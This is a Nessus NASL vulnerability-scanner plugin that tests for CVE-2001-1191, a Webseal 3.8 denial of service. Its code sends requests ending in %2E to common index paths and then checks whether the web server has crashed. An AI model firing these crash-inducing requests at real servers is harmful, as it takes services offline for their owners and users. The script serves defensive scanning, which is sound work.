# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# References:
# Date:  11 Dec 2001 09:22:50 -0000
# From: "Matthew Lane" <MatthewL@Janusassociates.com>
# To: bugtraq@securityfocus.com
# Subject: Webseal 3.8
#
# Affected:
# Webseal 3.8
#
# *unconfirmed*

if(description)
{
 script_id(11089);
 script_bugtraq_id(3685);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-2001-1191");
 
 name["english"] = "Webseal denial of service";
 name["francais"] = "Déni de service contre Webseal";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
The remote web server dies when an URL ending with %2E is requested.

A cracker may use this flaw to make your server crash continually.

Solution : upgrade your server or firewall it.
Risk factor : High"; 


 desc["francais"] = "
Le serveur web distant meurt quand on demande une URL qui se termine
par %2E

Un pirate pourrait utiliser cette faille pour tuer régulièrement
votre serveur.

Solution : mettez votre logiciel à jour ou protégez-le

Facteur de risque : Elevé";

 script_description(english:desc["english"],
 	 	    francais:desc["francais"]);
		    
 
 summary["english"] = "Request ending with %2E kills WebSeal"; 
 summary["francais"] = "Une requête qui se termine par %2E tue WebSeal";
 script_summary(english:summary["english"],
 		 francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
 		  francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);
if (! can_host_asp(port:port)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);

url[0] = "/index.html";
url[1] = "/index.htm";
url[2] = "/index.asp";
url[3] = "/";

for (i=0; i<4;i=i+1)
{
 req = http_get(port: port, item: string(url[i], "%2E"));
 send(socket: soc, data: req);
 r = http_recv(socket: soc);
 http_close_socket(soc);
 
 soc = http_open_socket(port);
 if(!soc) break;
}
# We must close the socket, VNC limits the number of parallel connections
if (soc) http_close_socket(soc);

if (http_is_dead(port: port)) { security_hole(port); }
